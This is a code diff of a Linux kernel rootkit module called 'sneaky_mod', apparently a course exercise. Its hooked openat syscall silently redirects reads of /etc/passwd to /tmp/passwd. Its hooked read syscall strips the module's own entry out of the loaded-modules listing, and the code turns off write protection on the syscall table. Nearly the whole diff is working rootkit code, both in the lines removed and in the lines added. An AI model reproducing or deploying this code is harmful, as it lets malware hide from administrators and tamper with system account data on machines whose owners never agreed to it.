@@ -75,20 +75,14 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 // ===========Define your new sneaky version of the 'openat' syscall===========================
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
-  // Implement the sneaky part here
-  // Cast the filename pointer from the registers
-  char __user *filename = (char __user *)regs->si;
+  // Extract the arguments from the regs structure
+  const char __user *filename_user = (const char __user *)regs->si;
 
-  // Buffer to store the filename
   char fname[256];
-
-  // Copy the filename from userspace to kernel space
-  strncpy_from_user(fname, filename, sizeof(fname));
-
-  // Check if the file being opened is /etc/passwd
+  strncpy_from_user(fname, filename_user, sizeof(fname));
   if (strcmp(fname, "/etc/passwd") == 0) {
-    // Redirect the openat call to /tmp/passwd
-    copy_to_user(filename, "/tmp/passwd", sizeof("/tmp/passwd"));
+    char new_fname[] = "/tmp/passwd";
+    copy_to_user((void __user *)filename_user, new_fname, strlen(new_fname) + 1);
   }
   return (*original_openat)(regs);
 }
@@ -121,28 +115,25 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
 // create a sneaky_read function to intercept the read system call
 asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
-  int fd = (int)regs->di;
-  void *buf = (void *)regs->si;
-  struct file *f;
+  char *buf = (char *)regs->si;
   ssize_t nread;
-
-  nread = original_read(regs);
-
-  f = fget(fd);
-  if (f) {
-    if (nread > 0 && strcmp(f->f_path.dentry->d_iname, "modules") == 0) {
-      void *st = strnstr(buf, "sneaky_mod", nread);
-      if (st != NULL) {
-        void *ed = strnstr(st, "\n", nread - (st - buf));
-        if (ed != NULL) {
-          int len = ed - st + 1;
-          memmove(st, ed + 1, nread - (st - buf) - len);
-          nread -= len;
-        }
+  nread = original_read(regs);  
+ 
+  if (nread > 0) {
+    char *st = strnstr(buf, "sneaky_mod ", nread);
+    if (st != NULL) {
+      char *ed = strnstr(st, "\n", nread - (st - buf));
+      if (ed != NULL) {
+        ed++;
+        memmove(st, ed, (char *)(regs->si) + nread - ed);
+        nread -= ed - st;
+        // int len = ed - st + 1;
+        // memmove(st, ed + 1, nread - (st - buf) - len);
+        // nread -= len;
       }
     }
-    fput(f);
   }
+    
 
   return nread;
 }
@@ -179,8 +170,6 @@ static int initialize_sneaky_module(void)
   return 0; // to show a successful load
 }
 
-
-
 static void exit_sneaky_module(void) 
 {
   printk(KERN_INFO "Sneaky module being unloaded.\n"); 
@@ -196,7 +185,6 @@ static void exit_sneaky_module(void)
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 }
-
 
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
